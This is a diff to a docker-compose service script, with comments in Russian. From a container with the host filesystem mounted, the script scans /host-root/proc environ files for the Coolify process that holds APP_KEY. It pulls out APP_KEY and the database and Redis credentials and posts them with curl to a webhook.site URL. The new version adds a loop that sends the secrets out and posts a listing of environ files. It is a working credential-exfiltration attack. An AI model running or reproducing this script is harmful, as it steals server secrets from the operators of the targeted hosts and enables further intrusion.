@@ -12,20 +12,15 @@ services:
       - |
         apk add --no-cache curl
         
-        # 1. Ищем PID процесса coolify по наличию APP_KEY в памяти
-        PID=$(grep -rl "APP_KEY" /host-root/proc/*/environ 2>/dev/null | head -1 | cut -d'/' -f5)
-        echo "Found PID: $PID" | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=debug_pid
+        # 1. Ищем PID через find + tr (Alpine-совместимо)
+        find /host-root/proc -maxdepth 3 -name environ 2>/dev/null | while read f; do
+          if tr '\0' '\n' < "$f" 2>/dev/null | grep -q "APP_KEY"; then
+            echo "FOUND: $f" | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=found_environ
+            tr '\0' '\n' < "$f" | grep -E "APP_KEY|DB_PASSWORD|DB_USERNAME|REDIS_PASSWORD" | curl -X POST --data-binary @- https://webhook.site/НОВЫЙ-URL?stage=secrets
+          fi
+        done
         
-        # 2. Если PID найден, вытаскиваем переменные окружения
-        if [ -n "$PID" ]; then
-          tr '\0' '\n' < /host-root/proc/$PID/environ | grep -E "APP_KEY|DB_PASSWORD|DB_USERNAME|REDIS_PASSWORD" > /tmp/secrets.txt
-        fi
-        
-        # 3. Отправляем результат
-        if [ -s /tmp/secrets.txt ]; then
-          cat /tmp/secrets.txt | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=secrets
-        else
-          echo "EXTRACTION_FAILED" | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=secrets
-        fi
+        # 2. Если ничего не нашли - отправляем список всех environ файлов для отладки
+        find /host-root/proc -maxdepth 3 -name environ 2>/dev/null | head -20 | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=environ_list
         
         sleep 3600
